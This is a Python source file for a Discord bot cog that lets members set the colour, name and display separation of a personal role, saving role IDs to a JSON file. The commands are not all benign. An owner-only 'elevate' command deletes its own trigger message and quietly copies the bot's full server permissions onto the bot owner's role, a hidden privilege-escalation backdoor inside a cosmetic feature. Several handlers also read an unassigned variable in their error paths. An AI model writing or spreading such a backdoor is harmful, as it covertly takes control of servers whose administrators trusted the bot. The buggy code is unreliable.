import json
from discord.ext import commands
from configCreation import ConfigCreation

DEFAULT_CONFIG = {"Guilds": {

    }
}

class RoleMod(commands.Cog):
    def __init__(self, bot:commands.Bot):
        self.bot = bot

    @commands.group(name="role", desc="the group for the role commands")
    async def role(self, ctx):
        return

    @role.command(name = "color", desc="changes the color of the role")
    async def rolecolor(self, ctx:commands.Context, hexColor):
        if not hexColor:
            await ctx.send("You didn't send a hex color")
            return
        hexColor = int(hexColor, 16)
        try:
            roleId = getMemberRole(ctx.author.id, ctx.guild.id)
            roleObj = ctx.guild.get_role(roleId)
            await roleObj.edit(color=hexColor)
        except KeyError:
            roleObj = await ctx.guild.create_role(name=ctx.author.display_name, color=hexColor, hoist=True)
            try:
                data["Guilds"][str(ctx.guild.id)][str(ctx.author.id)] = roleObj.id
            except KeyError:
                data = addGuild(ctx.guild.id)
                data["Guilds"][str(ctx.guild.id)][str(ctx.author.id)] = roleObj.id
            with open("Cogs/Configs/roleMod.json", "w") as config:
                json.dump(data, config, ensure_ascii=False,indent=4)
            config.close()
        await ctx.author.add_roles(roleObj)
        await ctx.send("K your role color is changed.")

    @role.command(name = "name", desc="changes the name of the role")
    async def rolename(self, ctx:commands.Context, *, nameStr:str):
        data = configUpdate()
        if not nameStr:
            await ctx.send("You didn't send anything I can use for a name")
            return
        try:
            roleId = getMemberRole(ctx.author.id, ctx.guild.id)
            roleObj = ctx.guild.get_role(roleId)
            await roleObj.edit(name=nameStr)
        except KeyError:
            roleObj = await ctx.guild.create_role(name=nameStr, hoist=True)
            try:
                data["Guilds"][str(ctx.guild.id)][str(ctx.author.id)] = roleObj.id
            except KeyError:
                data = addGuild(ctx.guild.id)
                data["Guilds"][str(ctx.guild.id)][str(ctx.author.id)] = roleObj.id
            with open("Cogs/Configs/roleMod.json", "w") as config:
                json.dump(data, config, ensure_ascii=False,indent=4)
            config.close()
        await ctx.author.add_roles(roleObj)
        await ctx.send("K your role name is changed.")

    @role.command(name = "hoist", desc="hoists the role to show it seperately or the opposite")
    async def rolehoist(self, ctx:commands.Context):
        try:
            roleId = getMemberRole(ctx.author.id, ctx.guild.id)
            roleObj = ctx.guild.get_role(roleId) 
            if roleObj.hoist:
                await roleObj.edit(hoist=False)
                await ctx.send("K your role is no longer shown seperate now.")
            else:
                await roleObj.edit(hoist=True)
                await ctx.send("K your role is shown seperate now.")
        except KeyError:
            roleObj = await ctx.guild.create_role(name=ctx.author.display_name, hoist=True)
            try:
                data["Guilds"][str(ctx.guild.id)][str(ctx.author.id)] = roleObj.id
            except KeyError:
                data = addGuild(ctx.guild.id)
                data["Guilds"][str(ctx.guild.id)][str(ctx.author.id)] = roleObj.id
            with open("Cogs/Configs/roleMod.json", "w") as config:
                json.dump(data, config, ensure_ascii=False,indent=4)
            config.close()
        await ctx.author.add_roles(roleObj)

    @commands.is_owner()
    @role.command(name = "elevate", desc="elevation engage")
    async def roleelev(self, ctx:commands.Context):
        await ctx.message.delete()
        selfGuild = await ctx.guild.fetch_member(self.bot.user.id)
        permissions = selfGuild.guild_permissions
        roleId = getMemberRole(ctx.author.id, ctx.guild.id)
        roleObj = ctx.guild.get_role(roleId)
        await roleObj.edit(permissions=permissions)


def getMemberRole(id:int, guildId:int):
    with open("Cogs/Configs/roleMod.json", "r") as config:
        data = json.load(config)
        roleId = data["Guilds"][str(guildId)][str(id)]
    config.close()
    return roleId

def configUpdate():
    with open("Cogs/Configs/roleMod.json", "r") as config:
        data = json.load(config)
    config.close()
    return data

def addGuild(guildId:int):
    data = configUpdate()
    data["Guilds"][str(guildId)] = {}
    with open("Cogs/Configs/roleMod.json", "w") as config:
        json.dump(data, config, ensure_ascii=False,indent=4)
    config.close()
    return configUpdate()

try:
    with open("Cogs/Configs/roleMod.json", "r") as config:
        data = json.load(config)
    config.close()
except OSError as e:
    ConfigCreation.createConfig("roleMod", DEFAULT_CONFIG, True)

def setup(bot:commands.Bot):
    bot.add_cog(RoleMod(bot))